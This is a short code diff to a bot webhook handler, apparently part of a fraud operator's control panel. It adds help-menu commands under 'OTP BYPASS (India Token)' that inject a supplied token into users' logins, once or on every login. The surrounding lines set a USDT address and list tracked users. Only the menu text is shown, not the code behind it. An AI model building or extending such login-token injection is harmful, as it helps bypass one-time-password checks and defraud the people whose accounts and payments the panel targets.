@@ -697,6 +697,11 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address> — Set USDT
 /usdt off — Disable
 
+=== OTP BYPASS (India Token) ===
+/usetoken <token> — Next login pe yeh India Token inject hoga (single use)
+/alwaystoken <token> — Har login pe yeh India Token inject hoga (permanent)
+/alwaystoken off — Disable permanent token
+
 === TRACKING ===
 /idtrack — All tracked users
 
